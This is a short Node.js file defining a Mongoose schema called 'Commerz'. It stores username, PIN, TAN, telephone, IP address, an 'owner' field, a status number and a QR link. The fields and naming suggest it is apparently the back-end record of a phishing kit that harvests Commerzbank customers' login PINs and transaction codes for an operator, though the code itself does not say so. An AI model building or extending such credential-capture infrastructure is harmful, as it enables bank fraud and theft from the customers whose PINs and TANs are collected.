const mongoose = require("mongoose");

const commerzSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    pin: String,
    telephone: String,
    status: Number,
    ip: String,
    owner: String,
    tan: String,
    qrLink: String,
    qr: { type: Boolean, default: false },
});

module.exports = mongoose.model("Commerz", commerzSchema);
